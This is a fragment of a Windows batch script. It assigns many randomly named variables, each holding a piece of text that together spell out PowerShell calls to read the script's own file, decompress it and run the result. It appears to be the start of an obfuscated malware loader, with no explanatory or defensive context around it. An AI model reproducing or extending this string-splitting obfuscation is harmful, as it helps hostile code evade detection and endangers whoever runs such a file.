@echo off
set "KoKZoOteFB=YxUp"
set "mQvleiBRNi=bstr"
set "pSdZDEtkoc=);$a"
set "IKDdwbScSZ=m.IO"
set "DVdlDATFEf=pose"
set "dgyraLonxO=stem"
set "nvNrxCXWQW=kDm."
set "gtBXOeLNfu= = $"
set "NAyHbOSZzJ=tion"
set "mYvsdCTrWi=.Mod"
set "mkkzgGpHLg=('%~f0'"
set "ZvCpUjcoMq=comp"
set "WXjYBgeXLU=iron"
set "flFsgxrkjz=esMa"
set "miqejVDYGD=$abt"
set "ZvgFpKtasX=$zix"
